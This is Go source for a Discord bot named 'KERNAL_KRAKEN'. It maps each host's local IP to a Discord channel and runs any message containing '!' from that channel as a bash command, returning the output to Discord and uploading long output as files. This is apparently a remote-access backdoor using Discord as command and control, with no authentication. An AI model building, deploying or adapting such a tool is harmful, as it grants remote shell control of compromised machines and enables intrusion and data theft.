package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func execute(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	channelID := setup()

	if m.ChannelID == channelID {
		if strings.Contains(m.Content, "!") {
			command := m.Content[1:]

			cmd := exec.Command("/bin/bash", "-c", command)
			out, err := cmd.Output()
			if err != nil {
				fmt.Println(err, " on ", command)
				s.ChannelMessageSend(m.ChannelID, string("Sorry the command failed, please try again."))
			}

			if len(out) > 2000 {
				now := time.Now()
				filename := "KERNAL_KRAKEN" + now.Format("2006-01-02_15-04-05.txt")
				err := ioutil.WriteFile(filename, []byte(out), 0644)
				if err != nil {
					fmt.Print(err)
				}
				file, err := os.Open(filename)
				if err != nil {
					fmt.Println(err)
				}
				defer file.Close()

				s.ChannelMessageSend(m.ChannelID, "Output too long, sending as file")
				s.ChannelFileSend(m.ChannelID, filename, file)
			}

			s.ChannelMessageSend(m.ChannelID, string(out))
		}
	}
}

func getLocalIP() (string, error) {
	// Get a list of network interfaces on the machine
	ifaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}

	// Loop through the network interfaces to find the IP address
	for _, iface := range ifaces {
		addrs, err := iface.Addrs()
		if err != nil {
			return "", err
		}
		for _, addr := range addrs {
			switch v := addr.(type) {
			case *net.IPNet:
				if !v.IP.IsLoopback() && v.IP.To4() != nil {
					return v.IP.String(), nil
				}
			}
		}
	}

	// Return an error if no IP address is found
	return "", fmt.Errorf("no IP address found")
}

func setup() string {
	ip, err := getLocalIP()
	if err != nil {
		fmt.Println(err)
	}

	ip = strings.Replace(ip, ".", "-", -1)

	file, err := os.Open("KernalKraken_config.txt")
	if err != nil {
		fmt.Println(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	channelID := ""
	for scanner.Scan() {
		if strings.Contains(scanner.Text(), ip) {
			line := strings.Split(scanner.Text(), " ")
			if len(line) > 1 {
				channelID = line[2]
			}
		}
	}

	return channelID

}

func main() {
	err := godotenv.Load(".env")
	if err != nil {
		log.Fatal("Error loading .env file")
	}

	sess, err := discordgo.New("Bot " + os.Getenv("GITHUB_CLIENT_TOKEN"))
	if err != nil {
		log.Fatal(err)
	}

	channelID := setup()

	sess.AddHandler(func(s *discordgo.Session, m *discordgo.MessageCreate) {
		if m.Author.ID == s.State.User.ID {
			return
		}

		if m.ChannelID == channelID {
			if m.Content == "ping" {
				s.ChannelMessageSend(m.ChannelID, "pong")
			}
		}
	})

	sess.AddHandler(execute)

	sess.Identify.Intents = discordgo.IntentsAllWithoutPrivileged

	err = sess.Open()
	if err != nil {
		log.Fatal(err)
	}

	defer sess.Close()
	fmt.Print("Bot is running...")

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc
}
